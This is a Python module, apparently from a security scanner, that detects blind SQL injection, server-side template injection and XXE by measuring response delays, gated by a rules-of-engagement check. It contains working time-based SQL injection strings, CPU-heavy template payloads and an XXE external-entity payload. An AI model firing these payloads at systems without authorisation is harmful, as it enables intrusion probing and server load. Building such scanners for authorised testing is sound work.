"""Blind / time-based injection detection.

Each probe measures a baseline request, then submits a payload that causes
a server-side delay (SQL SLEEP, template loop, XXE fetch to a non-routable
host). If the payload response is significantly slower than baseline, the
injection is marked SUSPICIOUS.

No OOB listener required; timing is the only signal.
"""
import time
import uuid
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

import httpx

from .config import load_engine
from .roe_guard import ROEGuard, ROEViolation
from . import http as _http


SQLI_DELAY_PAYLOADS = [
    ("' OR SLEEP({d})-- -", "mysql"),
    ("1' AND SLEEP({d})-- -", "mysql"),
    ("'; SELECT pg_sleep({d})--", "postgres"),
    ("' OR pg_sleep({d})--", "postgres"),
    ("'; WAITFOR DELAY '0:0:{d}'--", "mssql"),
    ("' OR 1=1; WAITFOR DELAY '0:0:{d}'--", "mssql"),
]

SSTI_DELAY_PAYLOADS = [
    ("{{ ''.join([str(i) for i in range({big})]) }}", "jinja2"),
    ("{% for i in range({big}) %}{% endfor %}", "twig"),
    ("${(function(){var x=0;for(var i=0;i<{big};i++)x+=i;return x;})()}", "el"),
]

XXE_DELAY_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://10.255.255.1/{n}">]>\n'
    '<root>&xxe;</root>'
)


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _send(url, method, params=None, data=None, headers=None,
          timeout=20, verify=None, roe_guard=None):
    if verify is None:
        verify = _verify_tls()
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"blocked": True, "error": f"ROE_BLOCK: {viol}",
                "elapsed_ms": 0.0}
    t0 = time.perf_counter()
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.request(method.upper(), url, params=params,
                          data=data, headers=headers or {},
                          skip_rate_limit=True)
        return {"status": r.status_code, "body": (r.text or "")[:2000],
                "elapsed_ms": (time.perf_counter() - t0) * 1000.0}
    except _http.TimeoutException:
        return {"status": None, "error": "timeout",
                "elapsed_ms": (time.perf_counter() - t0) * 1000.0}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}",
                "elapsed_ms": (time.perf_counter() - t0) * 1000.0}


def _median(vals):
    if not vals:
        return 0.0
    s = sorted(vals)
    n = len(s)
    if n % 2:
        return s[n // 2]
    return (s[n // 2 - 1] + s[n // 2]) / 2.0


def timing_sqli(target_url, param=None, method="GET",
                baseline_samples=2, delay_seconds=4, threshold_ms=None,
                headers=None, timeout=15, roe_guard=None, verify=None):
    """Blind SQLi via SLEEP / pg_sleep / WAITFOR DELAY timing."""
    if threshold_ms is None:
        threshold_ms = max(1200, int(delay_seconds * 1000 * 0.6))
    if not param:
        return {"verdict": "UNKNOWN",
                "reason": "no param provided for timing SQLi",
                "evidence": {}}
    baselines = []
    for _ in range(baseline_samples):
        r = _send(target_url, method, params={param: "1"}, headers=headers,
                  timeout=timeout, roe_guard=roe_guard, verify=verify)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {}}
        if r.get("status") is None:
            continue
        baselines.append(r["elapsed_ms"])
    if not baselines:
        return {"verdict": "UNKNOWN",
                "reason": "baseline requests did not complete",
                "evidence": {}}
    baseline_ms = _median(baselines)
    attempts = []
    for tmpl, engine in SQLI_DELAY_PAYLOADS:
        payload = tmpl.format(d=delay_seconds)
        r = _send(target_url, method, params={param: payload},
                  headers=headers, timeout=timeout + delay_seconds + 3,
                  roe_guard=roe_guard, verify=verify)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {}}
        elapsed = r.get("elapsed_ms", 0.0)
        delta = elapsed - baseline_ms
        attempts.append({
            "engine": engine, "payload": payload[:80],
            "status": r.get("status"),
            "elapsed_ms": round(elapsed, 1),
            "delta_ms": round(delta, 1),
        })
        if delta >= threshold_ms:
            return {
                "verdict": "SUSPICIOUS",
                "reason": (f"timing SQLi on param '{param}': {engine} "
                           f"payload delayed response by {delta:.0f}ms "
                           f"(baseline {baseline_ms:.0f}ms)"),
                "evidence": {"param": param,
                             "baseline_ms": round(baseline_ms, 1),
                             "threshold_ms": threshold_ms,
                             "attempts": attempts},
            }
    return {"verdict": "PASS",
            "reason": (f"no timing delay on param '{param}' across "
                       f"{len(attempts)} payloads"),
            "evidence": {"param": param,
                         "baseline_ms": round(baseline_ms, 1),
                         "attempts": attempts}}


def timing_ssti(target_url, param=None, method="GET",
                baseline_samples=2, loop_size=20_000_000,
                threshold_ms=1500, headers=None, timeout=15,
                roe_guard=None, verify=None):
    """Blind SSTI via CPU-heavy template loop."""
    if not param:
        return {"verdict": "UNKNOWN",
                "reason": "no param provided for timing SSTI",
                "evidence": {}}
    baselines = []
    for _ in range(baseline_samples):
        r = _send(target_url, method, params={param: "1"}, headers=headers,
                  timeout=timeout, roe_guard=roe_guard, verify=verify)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {}}
        if r.get("status") is None:
            continue
        baselines.append(r["elapsed_ms"])
    if not baselines:
        return {"verdict": "UNKNOWN",
                "reason": "baseline requests did not complete",
                "evidence": {}}
    baseline_ms = _median(baselines)
    attempts = []
    for tmpl, engine in SSTI_DELAY_PAYLOADS:
        payload = tmpl.format(big=loop_size)
        r = _send(target_url, method, params={param: payload},
                  headers=headers, timeout=timeout + 5,
                  roe_guard=roe_guard, verify=verify)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {}}
        elapsed = r.get("elapsed_ms", 0.0)
        delta = elapsed - baseline_ms
        attempts.append({
            "engine": engine, "payload": payload[:80],
            "status": r.get("status"),
            "elapsed_ms": round(elapsed, 1),
            "delta_ms": round(delta, 1),
        })
        if delta >= threshold_ms:
            return {
                "verdict": "SUSPICIOUS",
                "reason": (f"timing SSTI on param '{param}': {engine} "
                           f"payload delayed response by {delta:.0f}ms"),
                "evidence": {"param": param,
                             "baseline_ms": round(baseline_ms, 1),
                             "attempts": attempts},
            }
    return {"verdict": "PASS",
            "reason": (f"no timing delay on param '{param}' across "
                       f"{len(attempts)} SSTI payloads"),
            "evidence": {"param": param,
                         "baseline_ms": round(baseline_ms, 1),
                         "attempts": attempts}}


def timing_xxe(target_url, baseline_samples=2, threshold_ms=2500,
               headers=None, timeout=15, roe_guard=None, verify=None):
    """Blind XXE via external entity pointing at a non-routable host."""
    baselines = []
    for _ in range(baseline_samples):
        r = _send(target_url, "POST", data="<root/>",
                  headers={"Content-Type": "application/xml"},
                  timeout=timeout, roe_guard=roe_guard, verify=verify)
        if r.get("blocked"):
            return {"verdict": "UNKNOWN", "reason": r["error"],
                    "evidence": {}}
        if r.get("status") is None:
            continue
        baselines.append(r["elapsed_ms"])
    if not baselines:
        return {"verdict": "UNKNOWN",
                "reason": "baseline XML requests did not complete",
                "evidence": {}}
    baseline_ms = _median(baselines)
    payload = XXE_DELAY_PAYLOAD.format(n=uuid.uuid4().hex[:8])
    r = _send(target_url, "POST", data=payload,
              headers={"Content-Type": "application/xml"},
              timeout=timeout + 10, roe_guard=roe_guard, verify=verify)
    if r.get("blocked"):
        return {"verdict": "UNKNOWN", "reason": r["error"], "evidence": {}}
    elapsed = r.get("elapsed_ms", 0.0)
    delta = elapsed - baseline_ms
    evidence = {"baseline_ms": round(baseline_ms, 1),
                "payload_ms": round(elapsed, 1),
                "delta_ms": round(delta, 1),
                "status": r.get("status")}
    if delta >= threshold_ms:
        return {"verdict": "SUSPICIOUS",
                "reason": (f"timing XXE: external entity fetch delayed "
                           f"response by {delta:.0f}ms"),
                "evidence": evidence}
    return {"verdict": "PASS", "reason": "no timing delay on XXE probe",
            "evidence": evidence}


__all__ = ["timing_sqli", "timing_ssti", "timing_xxe"]
